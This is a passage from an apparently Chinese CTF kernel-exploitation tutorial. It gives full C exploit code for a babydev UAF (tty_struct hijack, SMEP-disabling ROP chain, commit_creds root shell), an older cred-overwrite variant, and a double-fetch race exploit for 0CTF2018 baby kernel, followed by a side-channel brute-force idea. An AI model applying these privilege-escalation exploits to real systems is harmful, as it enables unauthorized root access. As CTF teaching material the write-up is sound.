class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810d238d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RAX_RET 0xffffffff8100ce6e</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff81063694</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ_RET 0xffffffff814e35ef</span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    saveStatus();<br><br>    <span class="hljs-comment">//get the addr</span><br>    FILE* sym_table_fd = fopen(<span class="hljs-string">&quot;/proc/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x20</span>], p = <span class="hljs-number">0</span>;<br>    rop[p++] = POP_RDI_RET;<br>    rop[p++] = <span class="hljs-number">0x6f0</span>;<br>    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;<br>    rop[p++] = <span class="hljs-number">0</span>;<br>    rop[p++] = getRootPrivilige;<br>    rop[p++] = SWAPGS_POP_RBP_RET;<br>    rop[p++] = <span class="hljs-number">0</span>;<br>    rop[p++] = IRETQ_RET;<br>    rop[p++] = getRootShell;<br>    rop[p++] = user_cs;<br>    rop[p++] = user_rflags;<br>    rop[p++] = user_sp;<br>    rop[p++] = user_ss;<br><br>    <span class="hljs-type">size_t</span> fake_op[<span class="hljs-number">0x30</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;<br><br>    fake_op[<span class="hljs-number">0</span>] = POP_RAX_RET;<br>    fake_op[<span class="hljs-number">1</span>] = rop;<br><br>    <span class="hljs-type">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-type">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br>    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0x2e0</span>);<br>    close(fd1);<br><br>    <span class="hljs-type">size_t</span> fake_tty[<span class="hljs-number">0x20</span>];<br>    <span class="hljs-type">int</span> fd3 = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, <span class="hljs-number">2</span>);<br>    read(fd2, fake_tty, <span class="hljs-number">0x40</span>);<br>    fake_tty[<span class="hljs-number">3</span>] = fake_op;<br>    write(fd2, fake_tty, <span class="hljs-number">0x40</span>);<br><br>    write(fd3, buf, <span class="hljs-number">0x8</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>本地打包，运行，成功提权到root</p>
<p><img src="https://i.loli.net/2021/03/16/b31pgOZQydFAEoM.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>这道题在当年的解法据悉是<strong>通过 UAF 修改该进程的 cred 结构体的 uid、gid 为0</strong>，十分简单十分白给</p>
<p>但是<strong>此种方法在较新版本 kernel 中已不可行，我们已无法直接分配到 cred_jar 中的 object</strong>，这是因为 cred_jar 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</strong></p>
<blockquote>
<p>来着内核源码 4.5 <code>kernel/cred.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __init <span class="hljs-title function_">cred_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>	<span class="hljs-comment">/* allocate a slab in which we can store credentials */</span><br>	cred_jar = kmem_cache_create(<span class="hljs-string">&quot;cred_jar&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> cred), <span class="hljs-number">0</span>,<br>			SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>本题（4.4.72）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __init <span class="hljs-title function_">cred_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>	<span class="hljs-comment">/* allocate a slab in which we can store credentials */</span><br>	cred_jar = kmem_cache_create(<span class="hljs-string">&quot;cred_jar&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> cred),<br>				     <span class="hljs-number">0</span>, SLAB_HWCACHE_ALIGN|SLAB_PANIC, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>既然现在新的保护机制都出来了，那笔者认为在学习 kernel UAF 的过程中忽视掉这一点便是<strong>自欺欺人</strong>（而且这个解法<strong>太弱智了，完全没有学的意义</strong> -  - ），故这里便<strong>不再考虑</strong>以前旧的做法，感兴趣的参考如下exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br><br>    <span class="hljs-type">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-type">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br>    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0xa8</span>);<br>    close(fd1);<br><br>    <span class="hljs-type">int</span> pid = fork();<br><br>    <span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Unable to fork the new thread, exploit failed.\033[0m\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>) <span class="hljs-comment">// the child thread</span><br>    &#123;<br>        <span class="hljs-type">char</span> buf[<span class="hljs-number">30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>        write(fd2, buf, <span class="hljs-number">28</span>);<br><br>        <span class="hljs-keyword">if</span>(getuid() == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>            system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Unable to get the root, exploit failed.\033[0m\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">// the parent thread</span><br>    &#123;<br>        wait(<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//waiting for the child</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<h1 id="0x05-条件竞争（Race-condition）"><a href="#0x05-条件竞争（Race-condition）" class="headerlink" title="0x05.条件竞争（Race condition）"></a>0x05.条件竞争（Race condition）</h1><p>通常情况下在用户态下的 pwn 当中我们只有一个独立运行的主线程，并不存在所谓条件竞争的情况，但在 kernel pwn 当中<strong>由攻击者负责编写用户态程序，可以很轻易地启动多个线程同时运行</strong>，从而轻易地产生条件竞争</p>
<blockquote>
<p>不过近年来随着 glibc heap pwn 的套路逐渐挖掘殆尽，用户态下的 pwn 题也开始逐渐脱离 glibc 本身的利用而向多个其他方向发展，其中一个热门方向便是用户态下多线程造成条件竞争</p>
<blockquote>
<p>还有一个逐渐热门的方向便是 musl C 堆利用</p>
</blockquote>
</blockquote>
<h2 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double fetch"></a>double fetch</h2><p><code>double fetch</code> 直译就是 <code>取值两次</code>，直接理解就是在一次操作当中要<strong>两次（或是多次）重新获取某个对象的值</strong>，可能出现在下面这种情况当中：</p>
<ul>
<li>有一大段数据要从用户空间传给内核空间，但是直接传送整块数据会造成较大的开销，故选择<strong>只向内核传送一个指向用户地址空间的指针</strong></li>
<li>在后续的操作当中内核需要<strong>多次</strong>通过该指针获取到用户空间的数据</li>
</ul>
<p>例如：内核第一次先获取数据进行合法性验证，第二次再获取数据进行使用（如下图所示）</p>
<p><img src="https://i.loli.net/2021/09/08/pqLSVaINQ3zAsmO.png" srcset="/img/loading.gif" lazyload></p>
<p>不难看出，若是整个操作流程过长，则用户进程便有机会修改这一块数据，<strong>使得内核在两次访问这块空间时所获得的数据不一致，从而使得内核进入不同的执行流程</strong>，用户进程甚至可以<strong>直接开新的线程进行竞争来实现这个效果</strong></p>
<p><img src="https://i.loli.net/2021/09/08/GOSsNPkuMZHlUmT.png" srcset="/img/loading.gif" lazyload></p>
<p>通过在 first fetch 与 second fetch 之间的空挡修改数据从而改变内核执行流的利用手法便被称之为<code>double fetch</code></p>
<h3 id="例题：0CTF2018-Final-baby-kernel"><a href="#例题：0CTF2018-Final-baby-kernel" class="headerlink" title="例题：0CTF2018 Final - baby kernel"></a>例题：0CTF2018 Final - baby kernel</h3><h4 id="①-分析-2"><a href="#①-分析-2" class="headerlink" title="① 分析"></a>① 分析</h4><p>首先查看启动脚本，基本没开额外的保护</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-x86_64 \<br>-m 256M -smp 2,cores=2,threads=1  \<br>-kernel ./vmlinuz-4.15.0-22-generic \<br>-initrd  ./core.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot;</span> \<br>-cpu qemu64 \<br>-netdev user,<span class="hljs-built_in">id</span>=t0, -device e1000,netdev=t0,<span class="hljs-built_in">id</span>=nic0 \<br>-nographic  \<br></code></pre></td></tr></table></figure>

<p>解压文件系统，发现可疑驱动文件 <code>baby.ko</code>，惯例地 <code>checksec</code>，只开了 NX</p>
<p><img src="https://i.loli.net/2021/09/07/HkD2ygAPvb9BMSu.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>拖入 IDA 进行分析，只简单地定义了一个 ioctl</p>
<p><img src="https://i.loli.net/2021/09/07/Czo7jDP5YyXUKhr.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>其中参数 <code>0x6666</code> 可以获得 flag 在内核中的地址，参数 <code>0x1337</code> 则会将我们传入的 flag 与真正的 flag 进行对比，若正确则会将 flag 打印出来</p>
<p>测试一下，<code>dmesg</code> 权限开了，整挺好</p>
<p><img src="https://i.loli.net/2021/09/08/Q8Hyg4jGnSok2tW.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>简单分析可知我们应当传入如下结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">flag</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * flag_addr;<br>    <span class="hljs-type">int</span> flag_len;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>其中 <code>flag_len</code> 参数与 flag 的长度对比，在 .ko 文件中 flag 的长度为 33</p>
<p>在 <code>0x1337</code> 功能当中还会通过 <code>_chk_range_not_ok()</code> 函数检查我们传入的地址范围是否合法：</p>
<p><img src="https://i.loli.net/2021/09/08/QjFdxAHLOTkctUB.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>add 指令会影响 CF（产生进位&#x2F;借位）和 OF（两数最高位相同，结果最高位改变）标志位，v3获得的就是两数相加的 CF 位，这里一般为0（除非你传入 <code>0xffffffffffffffff</code> 附近的数），所以我们直接看另一个判断：a3 是否小于 v4</p>
<p>a3 为 current_task 的地址加上 0x1358 处所存地址，大概是 <code>task_struct-&gt;thread-&gt;fpu-&gt;state</code> 这个联合体内的某个位置上存的一个值，而 v4 则是我们传入的 flag 最后一个字节的地址，即我们传入的 flag 的地址不能够大于这个值</p>
<p>切 root 调一下我们可以发现这个值为 <code>0x7ffffffff000</code></p>
<p><img src="https://i.loli.net/2021/09/08/WFU9rzp1vSaR3hP.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>这个位置刚好是用户地址空间的栈底，即我们传入的 flag 的地址不能为用户地址空间外的地址</p>
<p><img src="https://i.loli.net/2021/09/08/tJ7uiEhCG4acbsd.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h4 id="②-利用"><a href="#②-利用" class="headerlink" title="② 利用"></a>② 利用</h4><p>虽然 flag 存储的地址已知，但是位于内核地址空间当中，我们将之直接传给模块并不能通过验证，那么这里就考虑 double fetch——先传入一个用户地址空间上的合法地址，开另一个线程进行竞争不断修改其为内核空间 flag 的地址，只要有一次命中我们便能获得 flag</p>
<p><img src="https://i.loli.net/2021/09/08/GOSsNPkuMZHlUmT.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="③-final-exploit-1"><a href="#③-final-exploit-1" class="headerlink" title="③ final exploit"></a>③ final exploit</h4><p>exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">pthread_t</span> compete_thread;<br><span class="hljs-type">void</span> * real_addr;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x20</span>] = <span class="hljs-string">&quot;arttnba3&quot;</span>;<br><span class="hljs-type">int</span> competetion_times = <span class="hljs-number">0x1000</span>, status = <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * flag_addr;<br>    <span class="hljs-type">int</span> flag_len;<br>&#125;flag = &#123;.flag_addr = buf, .flag_len = <span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">competetionThread</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (status)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; competetion_times; i++)<br>            flag.flag_addr = real_addr;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> ** envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd, result_fd, addr_fd;<br>    <span class="hljs-type">char</span> * temp, *flag_addr_addr;<br><br>    fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, O_RDWR);<br>    ioctl(fd, <span class="hljs-number">0x6666</span>);<br>    system(<span class="hljs-string">&quot;dmesg | grep flag &gt; addr.txt&quot;</span>);<br>    temp = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);    <br>    addr_fd = open(<span class="hljs-string">&quot;./addr.txt&quot;</span>, O_RDONLY);<br>    temp[read(addr_fd, temp, <span class="hljs-number">0x100</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    flag_addr_addr = <span class="hljs-built_in">strstr</span>(temp, <span class="hljs-string">&quot;Your flag is at &quot;</span>) + <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Your flag is at &quot;</span>);<br>    real_addr = strtoull(flag_addr_addr, flag_addr_addr + <span class="hljs-number">16</span>, <span class="hljs-number">16</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] flag addr: %llx&quot;</span>, real_addr);<br><br>    pthread_create(&amp;compete_thread, <span class="hljs-literal">NULL</span>, competetionThread, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">while</span> (status)<br>    &#123;    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; competetion_times; i++)<br>        &#123;<br>            flag.flag_addr = buf;<br>            ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;flag);<br>        &#125;<br>        system(<span class="hljs-string">&quot;dmesg | grep flag &gt; result.txt&quot;</span>);<br>        result_fd = open(<span class="hljs-string">&quot;./result.txt&quot;</span>, O_RDONLY);<br>        read(result_fd, temp, <span class="hljs-number">0x1000</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(temp, <span class="hljs-string">&quot;flag&#123;&quot;</span>))<br>            status = <span class="hljs-number">0</span>;<br>    &#125;<br>    pthread_cancel(compete_thread);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] competetion end!&quot;</span>);<br>    system(<span class="hljs-string">&quot;dmesg | grep flag&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行即得 flag</p>
<p><img src="https://i.loli.net/2021/09/08/NIrbAYh8UklgEsc.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>笔者原本想用 fscanf 读入 flag 地址，但是不明原因一直不能成功，然后又换了 sscanf 也不能成功…最后只好换了 strtoull …</p>
</blockquote>
<blockquote>
<h4 id="extra：测信道攻击"><a href="#extra：测信道攻击" class="headerlink" title="extra：测信道攻击"></a>extra：测信道攻击</h4><p>在进行比对时并没有检验 flag 地址的合法性，考虑如下内存布局：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">|                              |    &lt;---- unallocated page</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |    &lt;---- page alloc by mmap</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                     flag&#123;...X|</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |    &lt;---- unallocated page</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>

<p>我们将 flag 放在通过 mmap 分配而来的内存页的末尾，其最后一个字符 <code>X</code> 是我们将要爆破的未知字符</p>
<p>对于待比对字符 <code>X</code> 而言，若是比对失败则 ioctl 会直接返回，若是比对成功则指针移动到下一张内存页中进行解引用，<strong>此时将会直接造成 kernel panic</strong></p>
<p>由于 flag 被硬编码在 <code>.ko</code> 文件中，故通过是否造成 kernel panic 可以逐字符爆破 flag 内容</p>
<p>ASCII 可见字符 95 个，flag 长度 33，开头 <code>flag&#123;</code> 末尾 <code>&#125;</code> 减去6个字符，最多只需要爆破 <strong>26 * 95 &#x3D;  2470</strong> 次便能够获得 flag</p>
